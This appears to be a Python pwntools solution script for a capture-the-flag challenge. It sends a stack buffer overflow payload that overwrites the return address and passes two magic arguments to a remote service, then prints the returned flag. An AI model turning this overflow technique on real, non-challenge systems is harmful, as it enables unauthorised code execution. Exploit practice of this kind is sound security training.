from pwn import *

host = 'HOST_HERE'
port = PORT_HERE

padding = b'A' * 112 #Overflowing the buffer with 112 A's
eip = p32(0x08049296) #Setting the EIP pointer to 0x08049296
pad2 = b'B' * 4 #Adding padding the get to our arguments
arg1 = p32(0xCAFEF00D) #Is needed as the function won't run without this as argument 1
arg2 = p32(0xF00DF00D)#Is needed as the function won't run without this as argument 2
print('[+] Crafting payload...')
payload = padding + eip + pad2 + arg1 + arg2

connect = remote(host,port)
print('[+] Connecting...')
print('[+] Sending Payload...')
connect.sendlineafter('Please enter your string: ', payload) #Sends the payload after we recieve the line "Please enter your string"
output = connect.recvall()
print('FLAG => ' + str(output[130:])) #Outputting the flag
